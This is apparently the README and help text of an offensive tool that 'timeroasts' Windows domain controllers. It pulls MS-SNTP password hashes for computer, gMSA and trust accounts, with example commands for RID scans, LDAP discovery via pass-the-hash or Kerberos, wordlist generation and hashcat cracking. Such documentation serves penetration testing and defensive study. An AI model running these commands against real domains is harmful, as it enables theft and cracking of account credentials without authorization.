# kw-timeroast

Timeroasting: extract SNTP password hashes for computer and gMSA accounts via the MS-SNTP protocol.

## Help

```
$ kw-timeroast -h
usage: kw-timeroast [-h] [--version] [-v] [-r RANGE] [-R FILE]
                    [--format {auth,extended,both}]
                    [--password {current,previous,both}] [--ldap] [--ldap-ssl]
                    [-d DOMAIN] [-u USER] [-p PASS] [-H HASH] [-k] [-c FILE]
                    [--dc-hostname HOST] [-a N] [-t SEC] [--src-port PORT]
                    [--port PORT] [-o FILE] [--rid-prefix] [--wordlist FILE]
                    dc

Timeroasting: extract SNTP password hashes for computer, gMSA, and trust accounts.

positional arguments:
  dc                    Domain controller IP or hostname

options:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -v, --verbose         Increase verbosity (-v, -vv)

attack:
  -r RANGE, --rids RANGE
                        RID range (default: 500-10000). Supports: 1, 1-100,
                        1-, -100, -, 1-100,500-600
  -R FILE, --rids-file FILE
                        File with RIDs, one per line (same range syntax per
                        line)
  --format {auth,extended,both}
                        Packet format: auth=68-byte MD5 (default),
                        extended=120-byte KDF+HMAC-SHA512, both=send both per
                        RID
  --password {current,previous,both}
                        Which password to request: current (default),
                        previous, or both

ldap:
  --ldap                Query LDAP for computer accounts (requires auth)
  --ldap-ssl            Use LDAPS (port 636)
  -d DOMAIN, --domain DOMAIN
                        AD domain (e.g. corp.local)
  -u USER, --user USER  Username for LDAP auth
  -p PASS, --ldap-password PASS
                        Password for LDAP auth
  -H HASH, --hashes HASH
                        NT hash for LDAP auth (LM:NT, :NT, or NT)
  -k, --kerberos        Use Kerberos auth for LDAP
  -c FILE, --ccache FILE
                        Kerberos ccache file
  --dc-hostname HOST    DC FQDN (for Kerberos SPN, auto-detected if omitted)

network:
  -a N, --rate N        Queries per second (default: 180)
  -t SEC, --timeout SEC
                        Give up after SEC seconds of silence (default: 24)
  --src-port PORT       Source UDP port (default: dynamic). Set to 123 for
                        strict firewalls.
  --port PORT           Destination UDP port (default: 123)

output:
  -o FILE, --output FILE
                        Write hashes to file (splits by password age and hash
                        type)
  --rid-prefix          Prepend account name (or RID) to each output line
  --wordlist FILE       Write cracking wordlist (lowercase names, with and
                        without 14-char truncation)

Examples:
  kw-timeroast 10.0.0.1
  kw-timeroast 10.0.0.1 -r 500-2000 -o hashes.txt
  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p pass
  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -k -c admin.ccache
  kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -H :aabb... --wordlist crack.txt
  kw-timeroast 10.0.0.1 --format both --password both -o hashes.txt
  kw-timeroast 10.0.0.1 --rid-prefix
```

## Description

Sends NTP authentication requests to a domain controller and extracts password-equivalent hashes. The DC computes and returns a hash for any valid computer or gMSA RID without requiring credentials.

Two packet formats are supported:

| Format | Size | Algorithm | Hashcat mode |
|--------|------|-----------|-------------|
| Authenticator | 68 bytes | `MD5(NTOWFv1 \|\| salt)` | 31300 |
| ExtendedAuthenticator | 120 bytes | KDF(SP800-108, HMAC-SHA512) + HMAC-SHA512 | proposed |

### Timeroastable account types

Tested on Windows Server 2022 (Build 20348) and Server 2025 (Build 26100):

| Account type | objectClass | Timeroastable |
|---|---|---|
| Computer | computer | **YES** |
| gMSA | msDS-GroupManagedServiceAccount | **YES** |
| Trust account | user (INTERDOMAIN_TRUST_ACCOUNT) | **YES** (RID scan only — not in LDAP filter) |
| MSA | msDS-ManagedServiceAccount | No |
| dMSA | msDS-DelegatedManagedServiceAccount | No |
| User (even with `$` in name) | user | No |

## Arguments

### Target

| Argument | Description |
|----------|-------------|
| `dc` | Domain controller IP address or hostname |

### Attack options

| Flag | Description |
|------|-------------|
| `-r RANGE`, `--rids RANGE` | RID range to scan (default: 500-10000). Supports: `1`, `1-100`, `1-`, `-100`, `-`, `1-100,500-600` |
| `-R FILE`, `--rids-file FILE` | File with RID ranges, one per line (same syntax, `#` comments) |
| `--format {auth,extended,both}` | Packet format. `auth` = 68-byte MD5 (default). `extended` = 120-byte KDF+HMAC-SHA512. `both` = send both per RID. |
| `--password {current,previous,both}` | Which password to request. `current` (default), `previous`, or `both`. For 68-byte, bit 31 selects the password. For 120-byte, no wire-level distinction is possible. |

### LDAP options

LDAP mode queries the DC for computer and gMSA accounts, extracts their RIDs from objectSid, and uses sAMAccountNames to label output. Requires authentication.

| Flag | Description |
|------|-------------|
| `--ldap` | Enable LDAP mode (discover accounts, use their RIDs) |
| `--ldap-ssl` | Use LDAPS (port 636) |
| `-d DOMAIN`, `--domain DOMAIN` | AD domain (required for LDAP) |
| `-u USER`, `--user USER` | Username for LDAP NTLM auth |
| `-p PASS`, `--ldap-password PASS` | Password for LDAP auth |
| `-H HASH`, `--hashes HASH` | NT hash for LDAP auth (`LM:NT`, `:NT`, or `NT`) |
| `-k`, `--kerberos` | Use Kerberos SASL auth for LDAP |
| `-c FILE`, `--ccache FILE` | Kerberos ccache file |
| `--dc-hostname HOST` | DC FQDN for Kerberos SPN (auto-detected if omitted) |

When `--ldap` is used without `-r`, RIDs come from LDAP. When both `--ldap` and `-r` are specified, `-r` provides the RIDs and LDAP provides name labels.

### Network options

| Flag | Description |
|------|-------------|
| `-a N`, `--rate N` | Queries per second (default: 180) |
| `-t SEC`, `--timeout SEC` | Give up after SEC seconds of silence (default: 24) |
| `--src-port PORT` | UDP source port (default: dynamic). Set to 123 for strict firewalls. |
| `--port PORT` | Destination UDP port (default: 123) |

### Output options

| Flag | Description |
|------|-------------|
| `-o FILE`, `--output FILE` | Write hashes to file. Splits by password age and hash type (up to 4 files). |
| `--rid-prefix` | Prepend account name (or RID) to each output line. |
| `--wordlist FILE` | Write cracking wordlist (requires `--ldap`). Outputs lowercase names without `$`, both full and 14-char truncated. |
| `-v`, `--verbose` | Increase verbosity (`-v` for info, `-vv` for debug) |

## Output files

When using `-o hashes.txt`, output is split into up to 4 files:

| File | Contents |
|------|----------|
| `hashes-current-md5.txt` | 68-byte current password hashes |
| `hashes-current-sha512.txt` | 120-byte current password hashes |
| `hashes-previous-md5.txt` | 68-byte previous password hashes |
| `hashes-previous-sha512.txt` | 120-byte previous password hashes |

Only files with at least one hash are created.

## Hash formats

**68-byte MD5** (hashcat mode 31300):

```
$sntp-ms$<RID>$<32hex_digest>$<96hex_salt>
```

**120-byte KDF+HMAC-SHA512** (no hashcat module yet):

```
$sntp-ms-sha512$<RID>$<128hex_digest>$<96hex_salt>
```

## Wordlist

`--wordlist` generates a cracking wordlist for default machine account passwords. For each discovered account, it outputs:

- Lowercase sAMAccountName without `$` (full length)
- Same truncated to 14 characters (the pre-Windows 2000 default password limit)

Entries are deduplicated (names <= 14 chars only appear once).

## Examples

```bash
# Basic scan with defaults (68-byte MD5, current password, RIDs 500-10000)
kw-timeroast 10.0.0.1

# Custom RID range
kw-timeroast 10.0.0.1 -r 500-2000

# LDAP mode — discover accounts and timeroast them
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p 'Password1!'

# LDAP with Kerberos auth
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -k -c admin.ccache

# LDAP with pass-the-hash
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -H :aabbccdd...

# LDAP + wordlist for cracking default passwords
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p pass --wordlist crack.txt

# Both formats and both passwords (4 packets per RID)
kw-timeroast 10.0.0.1 --format both --password both -o hashes.txt

# Account names in output
kw-timeroast 10.0.0.1 --ldap -d CORP.LOCAL -u admin -p pass --rid-prefix

# Crack the MD5 hashes
hashcat -m 31300 hashes-current-md5.txt wordlist.txt
```

## Notes

- **No authentication needed** for blind RID scanning. LDAP mode requires credentials.
- **Targets computer and gMSA accounts.** MSA, dMSA, and user accounts do not respond to MS-SNTP.
- **68-byte format is the primary attack.** Hashcat mode 31300 cracks these hashes.
- **120-byte format** uses a stronger algorithm (KDF+HMAC-SHA512 with the RID as context). No hashcat module exists yet, but the hashes are captured for future cracking.
- **Previous password** on machine accounts: per the spec, machine accounts do not keep password history. The DC returns the current password for both current and previous selectors. Trust accounts may have a previous password.
- **LDAP filter** finds `(|(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))` with no disabled-account exclusion — the NTP probe determines what responds.
